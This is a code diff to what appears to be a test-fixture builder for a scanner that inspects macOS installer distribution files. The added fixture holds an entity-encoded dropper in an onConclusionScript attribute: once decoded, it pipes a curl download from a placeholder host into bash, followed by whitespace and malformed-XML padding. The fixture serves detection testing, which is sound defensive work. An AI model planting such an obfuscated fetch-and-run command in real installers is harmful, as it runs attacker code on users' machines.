@@ -71,6 +71,13 @@ def build():
     # Same, then junk that is not well-formed XML after the whitespace.
     add("distribution_junk_tail", dist + b"\n" * 400 + b"<" * 3000)
 
+    # Entity-encoded dropper in an attribute, then junk: only the decoded
+    # form shows `curl`.
+    ent = (b'<installer-gui-script><choice id="c" onConclusionScript="system.run('
+           b'&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;&#99;url -fsSL '
+           b'https://example-cdn.invalid/a.sh | /bin/bash&quot;)"/></installer-gui-script>')
+    add("distribution_entity_junk_tail", ent + b"\n" * 400 + b"<" * 3000)
+
     # The benign counterpart (the installer_distribution_js_ordinary fixture's).
     ordinary = (
         b'<?xml version="1.0" encoding="utf-8" standalone="yes"?>\n'
